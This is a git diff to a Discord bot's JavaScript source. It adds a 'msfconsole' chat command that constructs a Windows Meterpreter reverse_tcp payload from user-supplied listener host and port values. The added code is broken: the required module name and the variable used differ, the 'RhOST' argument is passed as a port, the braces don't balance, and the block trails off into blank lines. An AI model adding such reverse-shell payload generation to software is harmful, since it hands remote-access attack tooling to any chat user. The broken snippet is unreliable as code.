@@ -45,6 +45,7 @@ var PastebinAPI = require('pastebin-js'),
 const MongoClient = require('mongodb').MongoClient;
 const assert = require('assert');
 const factor = require('factors-number')
+const mfsjs = require('mfsjs')
 
 client.on("ready", () => {
 	console.log(`Bot has started, with ${client.users.size} users, in ${client.channels.size} channels of ${client.guilds.size} guilds.`);
@@ -88,6 +89,26 @@ client.on("message", async message => {
 		if (message.author.id === "395386053831426048") return message.channel.send("Permission denied.");
 		if (message.author.id === "352250257389912064") return message.channel.send("Permission denied.");
 		if (message.author.id === "350693449722232832") return message.channel.send("Permission denied.");
+		if(command == "msfconsole"){
+			if(!args[0]){return message.channel.send("you need an LHOST")}
+				if(!args[1]){return message.channel.send("you need an RhOST")}
+		var exploit = new msfjs.Meterpreter("windows/meterpreter/reverse_tcp", {
+
+	lhost: 		args[0],
+	lport:  	args[1],
+
+		}
+						    }
+		
+		
+		
+		
+		
+		
+		
+		
+		
+		
 		if (command == "bluebunny") {
 			var bluebunny = [
 				"http://www.rabbitfarming.net/wp-content/uploads/2017/05/American-Blue-Rabbit-Breeders-620x350.jpg",
